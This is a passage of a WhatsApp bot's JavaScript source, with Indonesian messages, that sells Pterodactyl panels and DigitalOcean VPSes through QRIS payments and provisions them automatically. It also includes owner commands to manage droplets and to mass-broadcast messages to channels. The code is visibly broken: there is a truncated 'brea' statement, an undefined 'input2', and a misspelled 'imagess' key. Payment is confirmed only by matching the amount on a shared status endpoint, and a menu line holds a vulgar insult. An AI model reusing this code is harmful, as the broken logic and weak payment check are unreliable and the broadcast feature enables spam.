const get = await axios.get(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)

const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
> Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
>
Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Kenz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = "❀ Kenz OfficiaL"
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case "buyp1": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buyp1* 2gb-v2
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb-v2") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb-v2") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb-v2") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb-v2") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb-v2") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb-v2") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb-v2") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb-v2") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb-v2") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb-v2") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli-v2" || cmd == "unlimited-v2") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)

const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
> Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Kenz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = "❀ Kenz OfficiaL"
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Kenz.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await Kenz.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Kenz.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *List All Id Channel*\n`
for (let i of listidch) {
teks += `\n*- ${i}\n*`
}
Kenz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Kenz.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
brea
case 'menu-panel':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.menu }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Populer",
 rows: [{
 header: 'Buy Panel Pterodactyl',
 title: "Server Private",
 description: `© Kenz Satoru`,
 id: `.buypanelprivate`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Panel Pterodactyl',
 title: "Server Public",
 description: `© Kenz Satoru`,
 id: `.buypanelpublic`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Panel Versi 1',
 title: "List Menu Panel",
 description: `© Kenz Satoru`,
 id: `.panelgb-v1`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Panel Versi 2',
 title: "List Menu Panel",
 description: `© Kenz Satoru`,
 id: `.panelgb-v2`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Panel Pterodactyl",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break

case 'buyvps': {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Kenz.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Kenz.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Kenz.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Kenz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Kenz.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Kenz.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================
case "sc": case "script": case "source":
 Kenz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 25000 * 1000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `

 👋 _*I N F O*_ 乂

> • _No Enc_
> • _Pairing_
> • _Jadibot_
> • _Fitur banyak_
> • _Fitur Keren_
 
`,
 contextInfo: {
 mentionedJid: 'p',
 externalAdReply: {
 showAdAttribution: true
 }
 }
 }
 }
 }
 }, {})
let kupppp = await Kenz.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let solsounddd = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `delever script`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Kenz;Bot;;;\nFN:Kenz Bot\nTEL;type=Mobile;waid=6285183671661:+62 851-3403-1285\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
